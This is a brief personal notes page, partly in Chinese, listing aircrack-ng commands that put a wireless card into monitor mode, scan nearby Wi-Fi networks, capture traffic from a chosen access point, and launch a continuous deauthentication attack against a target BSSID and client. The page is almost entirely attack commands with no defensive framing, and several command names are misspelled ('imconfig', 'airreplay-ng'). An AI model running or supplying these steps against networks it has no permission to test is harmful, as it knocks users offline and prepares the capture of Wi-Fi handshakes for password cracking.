---
title: aircrack-ng deauth
category: notes
date: 2024-04-01
---
首先安装`aircrack-ng`, 我用的是ALFA AWUS036ACH， 支持airmon-ng

1. `imconfig` to confirm no wireless connection
2. `sudo airmon-ng` find your wlan, like `wlan0`
3. `sudo airmon-ng start wlan0`, in this step you might see some other process is using `wlan0`, just kill the process, remeber the wireless card monitor, like `wlan0mon`.
4. `sudo airodump-ng wlan0mon` to scan wifi around, PWE shows signal strength from -1 to some negative numbers, the greater(-1 is the best) the better connection signal.
5. `sudo airodump-ng -c [channel#] -w [file directory] --bssid [found bssid from step 4] wlan0mon` to listen on a targer (your target)
6. `sudo airreplay-ng -0 0 -a [target bssid] -c [fake a client mac from step 5] wlan0mon`


[reference1](https://blog.csdn.net/vevenlcf/article/details/82084633)